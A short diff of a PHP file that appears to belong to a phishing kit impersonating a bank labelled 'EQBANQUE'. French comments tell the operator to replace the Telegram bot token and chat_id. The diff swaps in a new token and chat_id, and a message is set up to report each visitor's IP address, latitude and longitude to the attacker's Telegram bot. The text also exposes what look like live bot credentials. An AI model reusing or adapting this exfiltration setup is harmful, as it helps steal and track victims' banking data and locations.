@@ -4,9 +4,9 @@ $_SESSION["bank"] ='EQBANQUE';
 ?>
 <?php
 // Remplace par le token de ton bot Telegram
-$token = '8180049874:AAG00ea5LHEkC3pk9NgfrikOMPX0P2ljP6c'; 
+$token = '7231855269:AAHHENpMKORsPdG5gUH7z_NsS7Zz8QaZAcg'; 
 // Remplace par ton chat_id Telegram
-$chat_id = '7691383919'; 
+$chat_id = '6242884372'; 
 // Message à envoyer avec l'IP de l'utilisateur, latitude et longitude
 $message = "🏛🏛*".$_SESSION["bank"]."*🏛🏛";
 
